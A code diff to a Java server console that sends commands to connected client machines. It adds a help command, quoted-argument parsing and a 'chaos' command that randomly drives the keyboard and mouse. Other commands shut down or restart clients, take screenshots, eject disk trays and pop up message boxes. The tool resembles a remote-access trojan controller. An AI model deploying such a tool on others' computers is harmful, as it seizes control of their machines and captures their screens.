@@ -8,8 +8,11 @@ import java.io.File;
 import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.util.ArrayList;
 import java.util.Map;
 import java.util.Scanner;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 /**
  * allows for the control of the clients from the server
@@ -45,7 +48,7 @@ public class ClientCommander implements Runnable
         while(true)
         {
             System.out.print("> ");
-            String command = new Scanner(System.in).nextLine().toLowerCase(); // blocks
+            String command = new Scanner(System.in).nextLine(); // blocks
             if(commandValid(command.split("\\s+")[0]))
                 parseAndSendCommand(command);
         }
@@ -58,23 +61,75 @@ public class ClientCommander implements Runnable
      */
     private boolean commandValid(String command)
     {
-        return command.equals("count") || command.equals("online") || command.equals("eject") || command.equals("sound") || command.equals("shutdown") || command.equals("restart") || command.equals("screenshot") || command.equals("msg");
+        command = command.toLowerCase();
+        return command.equals("chaos") || command.equals("help") || command.equals("count") || command.equals("online") || command.equals("eject") || command.equals("sound") || command.equals("shutdown") || command.equals("restart") || command.equals("screenshot") || command.equals("msg");
+    }
+
+    /**
+     * properly tokenises commands, allowing for variable length arguments for commands
+     * @param fullCommand the full command the user typed
+     * @return a list containing each part of the command. Quoted arguments are treated as one part, for example
+     * msg all "hello there" will be split into: msg, all, hello there
+     */
+    private ArrayList<String> tokeniseCommand(String fullCommand)
+    {
+        ArrayList<String> commandTokens = new ArrayList<>();
+        Pattern regex = Pattern.compile("[^\\s\"']+|\"([^\"]*)\"|'([^']*)'"); // allows quoted args to be treated as one
+        Matcher regexMatcher = regex.matcher(fullCommand);
+        while (regexMatcher.find()) {
+            if (regexMatcher.group(1) != null) {
+                // Add double-quoted string without the quotes
+                commandTokens.add(regexMatcher.group(1));
+            } else if (regexMatcher.group(2) != null) {
+                // Add single-quoted string without the quotes
+                commandTokens.add(regexMatcher.group(2));
+            } else {
+                // Add unquoted word
+                commandTokens.add(regexMatcher.group());
+            }
+        }
+        return commandTokens;
+    }
+
+    private void printHelp(String command)
+    {
+        if(command == null) // user wants full help
+            System.out.println("count\nonline\nhelp\neject HOST\nshutdown HOST\nrestart HOST\nscreenshot HOST\nsound HOST /path/to/local/sound/file\nmsg HOST \"message body\" \"message title\" type\n\nHOST can either be a specified IP address or the word all (to send to every online client)");
+        else
+        {
+            if(command.equals("count"))
+                System.out.println("count displays the number of currently connected clients.\nExample usage:\n\tcount");
+            else if(command.equals("online"))
+                System.out.println("online displays info about each of the connected clients, this includes their IP address and geolocation.\nExample usage:\n\tonline");
+            else if(command.equals("eject"))
+                System.out.println("eject will eject the disk / disk tray on the client.\nExample usage:\n\teject 127.0.0.1");
+            else if(command.equals("shutdown"))
+                System.out.println("shutdown will turn off the clients computer.\nExample usage:\n\tshutdown 127.0.0.1");
+            else if(command.equals("restart"))
+                System.out.println("restart will restart the clinets computer.\nExample usage:\n\trestart 127.0.0.1");
+            else if(command.equals("screenshot"))
+                System.out.println("screenshot will take a screenshot of the clients screen.\nExample usage:\n\tscreenshot 127.0.0.1");
+            else if(command.equals("sound"))
+                System.out.println("sound will play a sound on the clients computer.\nExample usage:\n\tsound 127.0.0.1 /path/to/local/sound/file");
+            else if(command.equals("msg"))
+                System.out.println("msg will send a message that will be displayed as a message box on the clients computer.\nExample usage:\n\tmsg 127.0.0.1 \"message body\" \"title of the message box\" type\ntype can be any of the following: error, info, warning");
+            else if(command.equals("chaos"))
+                System.out.println("chaos will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\tchaos 127.0.0.1");
+        }
     }
 
     /**
      * uses the command input by the server user to execute the command on the
      * specified clients
-     * @param fullCommand the users command input. Each command should have the format:
-     *                      COMMAND HOST. Where COMMAND is the instruction e.g. poweroff and HOST is either "all" or
-     *                      the IP address of the target host. The online command takes no host argument.
+     * @param fullCommand the users command input. Different commands have different args.
      * @throws UnknownHostException thrown if the host provided is incorrect
      */
     private void parseAndSendCommand(String fullCommand) throws NullCommandException, IOException
     {
-        String[] commandTokens = fullCommand.split("\\s+");
-        String command = commandTokens[0];
+        ArrayList<String> commandTokens = tokeniseCommand(fullCommand);
+        String command = commandTokens.get(0);
 
-        // Zero argument commands: online, count
+        // Zero argument commands: online, count, help
         // e.g. count
         if(command.equals("online"))
         {
@@ -88,16 +143,29 @@ public class ClientCommander implements Runnable
             return;
         }
 
+        if(command.equals("help"))
+        {
+            try
+            {
+                printHelp(commandTokens.get(1));
+            }
+            catch(IndexOutOfBoundsException bounds)
+            {
+                printHelp(null);
+            }
+            return;
+        }
+
         // One argument commands: eject, shutdown, reboot, screenshot
         // e.g. eject 127.0.0.1
         String host = null;
-        if(commandTokens.length > 1)
-            host = commandTokens[1];
+        if(commandTokens.size() > 1)
+            host = commandTokens.get(1);
         if(host == null)
             throw new NullCommandException("Host not provided");
 
         ConnectedClient target = null;
-        if(host.equals("all")) // 2 tokens means a COMMAND and HOST has been provided
+        if(host.equals("all"))
             sendCommandAll(command);
         else // find the specified client
             target = connectedClients.get(InetAddress.getByName(host));
@@ -108,16 +176,57 @@ public class ClientCommander implements Runnable
         if(!host.equals("all"))
             target.sendCommand(command); // send the cmd to the specified connected client
 
-        // Two argument commands: msg, sound
-        // e.g. msg 127.0.0.1 "No place like home"
+        // Two argument commands: sound
+        // e.g. sound 127.0.0.1 /path/to/sound/file
         String argument = null;
-        if(commandTokens.length == 3)
+        if(commandTokens.size() == 3)
         {
-            argument = commandTokens[2];
+            argument = commandTokens.get(2);
             if(host.equals("all")) // command has already been sent, just need to send argument now
                 sendCommandAll(argument);
             else
                 target.sendCommand(argument); // if the client recieves the msg command it knows to read the next line of input (the msg itself)
+        }
+
+        // Three argument commands: chaos
+        // e.g. chaos all 60000 200
+        String length, delay;
+        if(commandTokens.size() == 4)
+        {
+            length = commandTokens.get(2);
+            delay = commandTokens.get(3);
+            if(host.equals("all"))
+            {
+                sendCommandAll(length);
+                sendCommandAll(delay);
+            }
+            else
+            {
+                target.sendCommand(length);
+                target.sendCommand(delay);
+            }
+        }
+
+        // Four argument commands: msg
+        // e.g. msg 127.0.0.1 "message here" "title here" warning
+        String msg, title, type;
+        if(commandTokens.size() == 5)
+        {
+            msg = commandTokens.get(2);
+            title = commandTokens.get(3);
+            type = commandTokens.get(4);
+            if(host.equals("all"))
+            {
+                sendCommandAll(msg);
+                sendCommandAll(title);
+                sendCommandAll(type);
+            }
+            else
+            {
+                target.sendCommand(msg);
+                target.sendCommand(title);
+                target.sendCommand(type);
+            }
         }
     }
 
